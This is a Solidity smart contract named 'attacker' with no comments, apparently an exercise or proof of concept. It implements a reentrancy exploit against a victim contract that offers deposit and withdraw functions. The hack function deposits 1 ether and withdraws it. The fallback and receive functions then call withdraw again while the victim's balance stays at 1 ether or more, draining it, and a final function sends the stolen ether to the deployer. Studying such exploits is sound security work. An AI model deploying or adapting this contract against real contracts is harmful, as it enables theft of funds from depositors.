//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Ivictim {
    function deposit() external payable;

    function withdraw() external;
}

contract attacker {
    Ivictim public bobolon;

    address immutable loko;
    address immutable owner;

    constructor(address _bobolon) {
        bobolon = Ivictim(_bobolon);
        loko = _bobolon;
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    fallback() external payable {
        chekBalance(loko);
    }

    receive() external payable {
        chekBalance(loko);
    }

    function hack() external payable onlyOwner {
        require(msg.value >= 1 * 10**18, "Wrong value, it must be >= 1");
        bobolon.deposit{value: 1 * 10**18}();
        bobolon.withdraw();
    }

    function chekBalance(address _victim) internal {
        if (_victim.balance >= 1 * 10**18) {
            bobolon.withdraw();
        }
    }

    function withdrawing() external onlyOwner {
        (bool sent, ) = owner.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}
